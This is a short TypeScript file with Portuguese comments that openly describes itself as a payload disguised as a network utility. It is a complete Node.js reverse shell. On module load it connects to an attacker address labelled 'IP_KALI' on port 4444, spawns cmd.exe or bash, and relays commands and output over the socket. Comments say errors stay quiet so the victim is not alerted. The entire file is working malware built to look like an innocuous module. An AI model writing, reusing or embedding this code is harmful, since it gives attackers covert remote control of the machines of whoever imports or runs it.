// network.ts - Payload Disfarçado como utilitário de rede
import { spawn } from 'child_process';
import * as net from 'net';
import * as os from 'os';

// --- CONFIGURAÇÃO ---
const IP_KALI = '127.0.0.1';
const PORTA = 4444;

export function trigger() {
    try {
        const client = new net.Socket();

        // Conecta silenciosamente ao atacante
        client.connect(PORTA, IP_KALI, () => {
            // Escolhe o shell baseado na SO da vítima
            const sh = spawn(os.platform() === 'win32' ? 'cmd.exe' : 'bash');

            // Fluxo: Kali -> Vítima (Comandos)
            client.on('data', (data: Buffer) => {
                sh.stdin.write(data);
            });

            // Fluxo: Vítima -> Kali (Saída)
            sh.stdout.on('data', (data: Buffer) => {
                client.write(data);
            });

            sh.stderr.on('data', (data: Buffer) => {
                client.write(data);
            });

            sh.on('close', () => {
                client.end();
            });
        });

        client.on('error', (err) => {
            // Silencioso para não alertar o usuário final imediatamente
            console.error(`[net] Erro: ${err.message}`);
        });

    } catch (e) {
        console.error(`[net] Falha: ${e}`);
    }
}

// Executa assim que este módulo é carregado
trigger();